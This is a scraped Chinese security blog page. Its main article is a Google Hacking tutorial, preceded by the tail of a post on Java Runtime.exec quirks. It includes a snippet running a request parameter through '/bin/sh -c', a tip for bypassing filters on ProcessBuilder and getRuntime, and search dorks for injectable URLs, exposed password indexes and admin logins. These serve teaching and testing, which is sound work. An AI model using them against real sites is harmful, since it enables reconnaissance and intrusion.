cmd;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最后再来一段代码，下面这段代码才会是java下命令执行的完全体。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。&lt;/p&gt;\n&lt;p&gt;最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(String... command) {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = new ArrayList&amp;#x3C;&gt;(command.length);        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    for (String arg : command)            &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command.add(arg);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(List&amp;#x26;lt;String&amp;#x26;gt; command) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    if (command == null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    throw new NullPointerException();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = command;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。&lt;/p&gt;\n&lt;p&gt;原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。&lt;/p&gt;\n&lt;p&gt;所以Java下的命令稍微改造一下代码就好。&lt;/p&gt;\n&lt;p&gt;还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/24.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;小结\&quot;&gt;小结&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#小结\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。&lt;/p&gt;\n&lt;p&gt;所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。&lt;/p&gt;\n&lt;p&gt;java的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;差别&quot;],&quot;text&quot;:[0,&quot;差别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;小结&quot;],&quot;text&quot;:[0,&quot;小结&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/15&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">4</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><div class="bg-foreground/10 flex w-40 flex-col rounded-xl opacity-75 transition-all duration-300 hover:opacity-100" data-collapsible="true"><button class="flex-center hover:bg-foreground/5 h-12 w-full cursor-pointer rounded-xl transition-colors" aria-expanded="false" aria-controls="_r10R_a_-collapse-1" aria-label="文章菜单" type="button"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down ml-2 text-base transition-transform duration-300" aria-hidden="true"></i></button><div id="_r10R_a_-collapse-1" class="collapse-content collapse-hidden" data-collapse-content="true"><div class="flex flex-col items-center"><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a></div></div></div><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#site" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="site:"><span class="heading-text block flex-1 truncate leading-relaxed">site:</span></a></div><div class="heading-tree-item relative"><a href="#filetype" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="filetype:"><span class="heading-text block flex-1 truncate leading-relaxed">filetype:</span></a></div><div class="heading-tree-item relative"><a href="#inurl" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="inurl:"><span class="heading-text block flex-1 truncate leading-relaxed">inurl:</span></a></div><div class="heading-tree-item relative"><a href="#intitle" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="intitle:"><span class="heading-text block flex-1 truncate leading-relaxed">intitle:</span></a></div><div class="heading-tree-item relative"><a href="#intext" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.5rem" data-level="1" aria-label="intext："><span class="heading-text block flex-1 truncate leading-relaxed">intext：</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/18" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">一些情报源</span></a><a href="/blog/post/14" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Google Hacking</span></a><a href="/blog/post/15" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">JAVA奇怪的命令执行</span></a><a href="/blog/post/7" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Common process for handling objectives</span></a><a href="/blog/post/5" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mandatory manual</span></a><a href="/blog/post/6" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">信息收集</span></a><a href="/blog/post/2" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">人肉搜索</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><a href="/blog/post/18" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1" title="一些情报源"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.8284 12.0007L15.7782 16.9504L14.364 18.3646L8 12.0007L14.364 5.63672L15.7782 7.05093L10.8284 12.0007Z"></path></svg><span class="truncate text-xs">一些情报源</span></a><a href="/blog/post/15" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="JAVA奇怪的命令执行"><span class="truncate text-xs">JAVA奇怪的命令执行</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> <div class="flex min-w-0 grow flex-col gap-8 md:w-full">     <div class="shadow-box bg-gradient-start flex flex-col gap-2 px-10 py-8 tablet:px-6 tablet:pt-6 tablet:pb-2"> <!-- Breadcrumb Navigation --> <nav class="text-muted-foreground flex items-center gap-2 text-sm"> <div class="flex items-center gap-1"> <!-- Home Icon and Link --> <i class="fa-solid fa-house-chimney text-sm" aria-hidden="true"></i> <a href="/blog" aria-label="返回首页"> <span class="hover:text-blue transition-colors duration-300">首页</span> </a> </div> <!-- Category Breadcrumbs -->  <i class="fa-solid fa-angle-right text-muted-foreground/60 text-sm" aria-hidden="true"></i> <a href="/blog/categories/Penetration" class="hover:text-blue transition-colors duration-300 text-primary bg-primary/10 hover:text-primary hover:bg-primary/20 rounded-full px-2.5 py-1" aria-label="前往Penetration分类"> Penetration </a>  </nav> <astro-island uid="23gnzk" prefix="r3" component-url="/_astro/SummaryPanel.s-MDUzWg.js" component-export="SummaryPanel" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;summary&quot;:[0,&quot;site: 功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。 示例： site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页 “sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页 filetype: 功能：搜索指定文件类型 示例： inurl:...&quot;],&quot;source&quot;:[0,&quot;auto&quot;],&quot;className&quot;:[0,&quot;mt-2&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SummaryPanel&quot;,&quot;value&quot;:true}" await-children><div class="overflow-hidden rounded-lg mt-2"><button class="bg-foreground/5 flex w-full cursor-pointer items-center justify-between px-4 py-3 transition-all duration-250 hover:bg-foreground/10 rounded-lg" aria-expanded="false" aria-controls="summary-panel-content"><div class="text-muted-foreground flex items-center gap-1.5 text-sm font-medium"><span class="transition-transform duration-300"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-primary size-4" aria-hidden="true"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span>摘要</div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-muted-foreground size-4 transition-transform duration-300" aria-hidden="true"><path d="M12 16L6 10H18L12 16Z"></path></svg></button><div id="summary-panel-content" class="grid transition-[grid-template-rows] duration-300 ease-out" style="grid-template-rows:0fr"><div class="overflow-hidden"><div class="bg-foreground/5 text-muted-foreground rounded-b-lg px-4 py-4 text-sm leading-relaxed"><span class="sr-only">site: 功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。 示例： site:zhihu.com 搜索跟知乎相关的网页 “web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页 “sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页 filetype: 功能：搜索指定文件类型 示例： inurl:...</span><p aria-hidden="true"><span></span></p></div></div></div></div><!--astro:end--></astro-island> <article class="prose md:prose-sm dark:prose-invert"> <div class="custom-content"> <h1 id="site"><strong>site:</strong><a class="anchor-link" href="#site"><span class="icon icon-link"></span></a></h1>
<p>功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。</p>
<p>示例：</p>
<p>site:zhihu.com 搜索跟知乎相关的网页</p>
<p>“web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页<br>
<br>“sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页</p>
<h1 id="filetype"><strong>filetype:</strong><a class="anchor-link" href="#filetype"><span class="icon icon-link"></span></a></h1>
<p>功能：搜索指定文件类型</p>
<p>示例：</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>“web安全” filetype:pdf 搜索跟web安全相关的pdf文件</span></span>
<span class="line"><span>nmap filetye:ppt 搜索跟nmap相关的ppt文件</span></span>
<span class="line"><span>site:csdn.net filetype:pdf 搜索csdn网站中的pdf文件</span></span>
<span class="line"><span>filetype:pdf site:www.51cto.com 搜索51cto的pdf文件</span></span></code></pre>
<h1 id="inurl"><strong>inurl:</strong><a class="anchor-link" href="#inurl"><span class="icon icon-link"></span></a></h1>
<p>功能：搜索url网址存在特定关键字的网页，可以用来搜索有注入点的网站</p>
<p>示例：</p>
<p>inurl:.php?id= 搜索网址中有”.php?id=“的网页</p>
<p>inurl:view.php=? 搜索网址中有”view.php=“的网页</p>
<h1 id="intitle"><strong>intitle:</strong><a class="anchor-link" href="#intitle"><span class="icon icon-link"></span></a></h1>
<p>功能：搜索正文存在关键字的网页</p>
<p>示例：</p>
<p>intitle:后台登陆搜索网页标题是”后台登陆”的网页</p>
<p>intitle:后台登陆 filetype:php 搜索网页标题是”后台登录”的php网页</p>
<p>intitle:index of “keyword”搜索keyword相关的索引目录信息</p>
<p>intitle:index of “password”搜索密码相关的索引目录信息</p>
<p>intitle:index of “login”搜索登陆页面信息</p>
<p>**</p>
<h1 id="intext">intext：<a class="anchor-link" href="#intext"><span class="icon icon-link"></span></a></h1>
<p>**</p>
<p>功能：搜索正文中存在关键字的页面</p>
<p>示例：</p>
<p>intext:Powered by wordpress 搜索wordpress制作的博客网址</p>
<p>intext:Powered by *CMS 搜索*CMS相关的网页</p>
<p>intext:powered by xxx inurl:login 搜索此类网址的后台登陆页面</p>
<p>查找条件可混用，例如：intitle:管理页面 intext:“忘记密码”</p>
<h3 id="cache"><strong>cache</strong><a class="anchor-link" href="#cache"><span class="icon icon-link"></span></a></h3>
<p>搜索搜索引擎里关于某些内容的缓存，可能会在过期内容里发现有价值的信息</p>
